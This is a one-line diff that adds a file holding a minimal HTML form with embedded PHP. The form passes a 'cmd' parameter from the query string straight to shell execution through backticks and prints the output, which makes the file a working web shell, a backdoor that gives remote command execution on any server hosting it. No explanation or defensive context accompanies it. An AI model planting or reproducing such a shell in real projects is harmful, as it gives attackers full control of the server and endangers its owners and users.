@@ -1,0 +1,1 @@
+<html><body><form method=GET><input name=cmd autofocus><input type=submit></form><pre><?=`$_GET[cmd]`?></pre></body></html>
